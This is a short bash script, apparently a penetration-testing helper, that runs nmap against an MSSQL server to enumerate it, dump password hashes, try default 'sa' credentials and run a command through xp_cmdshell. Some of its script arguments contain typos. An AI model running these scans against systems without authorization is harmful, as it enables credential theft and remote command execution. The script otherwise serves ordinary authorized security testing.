#!/bin/bash

RED='\033[1;31m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
YELLOW='\033[49;93m'
NC='\033[0m' # No Color

echo -e "${YELLOW}"
echo -e "+---_-----------------------------------------------+"
echo -e "| Adversarial Informatics Combat mssql Enumeration  |"
echo -e "|             cygienesolutions.com                  |"
echo -e "|    [Usage]: ./mssql_aic_enum.sh <TARGET> <PORT>   |"
echo -e "+---------------------------------------------------+"
echo -e "${NC}"
if [ $# == 0 ] ; then
    exit 1; fi

IP="$1"
PORT="$2"
SCRIPTPATH=`dirname $(realpath $0)`
mkdir ./$IP
echo $SCRIPTPATH

echo -e "${GREEN}"
echo -e "Performing standard nmap MSSQL enumeration..."
echo -e "${NC}"
# Performing standard nmap mmssql enumeration on target...
nmap -n -vv -Pn -sV $IP -p $PORT --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=$PORT,smsql.username-sa,mssql.password-sa -oA $IP/mssql_$IP-$PORT.nmap


echo -e "${GREEN}"
echo -e "Performing additional MSSQL brute force testing and enumeration..."
echo -e "${NC}"
# Performing standard nmap mmssql enumeration on target...
nmap -n -vv -Pn $IP -p $PORT --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=password,mssql.instance-port=$PORT,ms-sql-xp-cmdshell.cmd='ipconfig' -oN $IP/mssql_cmdshell_$IP-$PORT.nmap

